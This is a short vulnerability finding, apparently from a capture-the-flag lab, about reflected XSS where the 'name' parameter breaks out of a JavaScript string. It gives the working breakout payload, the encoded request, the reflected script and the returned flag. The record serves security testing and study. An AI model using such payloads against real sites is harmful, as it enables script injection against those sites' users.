findings.title: Reflected XSS in JavaScript String Context via 'name' Parameter
findings.description: The /page endpoint reflects the 'name' GET parameter directly into a JavaScript string assignment without sanitization: `var name = "USER_INPUT";`. By injecting `";alert('XSS')//`, an attacker breaks out of the string literal and executes arbitrary JavaScript. The server-side validation confirms successful exploitation by returning the CTF flag.
findings.evidence:
Request: GET /page?name=%22%3Balert(%27XSS%27)%2F%2F

Reflected payload in response:
<script> var name = "";alert('XSS')//"; document.write('Hello ' + name); </script>

Server response: Congratulations! Here is the flag: flag{9d55bbc2-90fa-40d4-89cd-c6c7a57915eb}

reproduction.expected: JavaScript alert('XSS') executes; page shows congratulations with flag{9d55bbc2-90fa-40d4-89cd-c6c7a57915eb}
